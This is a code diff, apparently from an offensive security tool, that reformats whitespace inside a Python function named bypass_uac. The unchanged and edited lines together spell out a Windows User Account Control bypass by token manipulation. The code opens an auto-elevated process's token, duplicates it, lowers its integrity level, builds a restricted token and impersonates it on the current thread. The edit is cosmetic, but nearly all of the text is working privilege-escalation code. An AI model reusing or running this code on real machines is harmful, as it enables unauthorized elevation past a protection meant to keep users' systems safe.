@@ -292,7 +292,7 @@ def bypass_uac(autoelevated_exe, lpApplicationName, param):
     ###### Open token of elevated process. ######
 
     hProcessToken = HANDLE(INVALID_HANDLE_VALUE)
-    if not NT_SUCCESS( NtOpenProcessToken(shinfo.hProcess, MAXIMUM_ALLOWED, byref(hProcessToken)) ):
+    if not NT_SUCCESS(NtOpenProcessToken(shinfo.hProcess, MAXIMUM_ALLOWED, byref(hProcessToken))):
         raise WinError()
 
     ###### Duplicate primary token ######
@@ -312,7 +312,7 @@ def bypass_uac(autoelevated_exe, lpApplicationName, param):
     obja.SecurityQualityOfService = addressof(sqos)
 
     hTokendupe = HANDLE(INVALID_HANDLE_VALUE)
-    if not NT_SUCCESS( DuplicateTokenEx(hProcessToken, TOKEN_ALL_ACCESS, byref(obja), False, TokenPrimary, byref(hTokendupe)) ):
+    if not NT_SUCCESS(DuplicateTokenEx(hProcessToken, TOKEN_ALL_ACCESS, byref(obja), False, TokenPrimary, byref(hTokendupe))):
         raise WinError()
 
     ###### Lower duplicated token IL from High to Medium. ######
@@ -328,32 +328,32 @@ def bypass_uac(autoelevated_exe, lpApplicationName, param):
     mlAuthority.byte5 = 0x10
 
     pIntegritySid = PSID()
-    if not NT_SUCCESS( RtlAllocateAndInitializeSid(
+    if not NT_SUCCESS(RtlAllocateAndInitializeSid(
             byref(mlAuthority),
             1, SECURITY_MANDATORY_MEDIUM_RID,
             0, 0, 0, 0, 0, 0, 0,
-            byref(pIntegritySid)) ):
+            byref(pIntegritySid))):
         raise WinError()
 
     tml = TOKEN_MANDATORY_LABEL()
     tml.Label.Attributes = SE_GROUP_INTEGRITY
     tml.Label.Sid = pIntegritySid
-    if not NT_SUCCESS( NtSetInformationToken(hTokendupe, TokenIntegrityLevel, byref(tml), sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)) ):
+    if not NT_SUCCESS(NtSetInformationToken(hTokendupe, TokenIntegrityLevel, byref(tml), sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid))):
         raise WinError()
 
     ###### Create restricted token. ######
 
     hLuaToken = HANDLE(INVALID_HANDLE_VALUE)
-    if not NT_SUCCESS( NtFilterToken(hTokendupe, LUA_TOKEN, None, None, None, byref(hLuaToken)) ):
+    if not NT_SUCCESS(NtFilterToken(hTokendupe, LUA_TOKEN, None, None, None, byref(hLuaToken))):
         raise WinError()
 
     ###### Impersonate logged on user. ######
 
     hImpToken = HANDLE(INVALID_HANDLE_VALUE)
-    if not NT_SUCCESS( DuplicateTokenEx(hLuaToken, TOKEN_IMPERSONATE | TOKEN_QUERY, byref(obja), 2, TokenImpersonation, byref(hImpToken)) ):
+    if not NT_SUCCESS(DuplicateTokenEx(hLuaToken, TOKEN_IMPERSONATE | TOKEN_QUERY, byref(obja), 2, TokenImpersonation, byref(hImpToken))):
         raise WinError()
 
-    if not NT_SUCCESS( NtSetInformationThread(GetCurrentThread(), ThreadImpersonationToken, byref(hImpToken), sizeof(HANDLE)) ):
+    if not NT_SUCCESS(NtSetInformationThread(GetCurrentThread(), ThreadImpersonationToken, byref(hImpToken), sizeof(HANDLE))):
         raise WinError()
 
     NtClose(hImpToken)
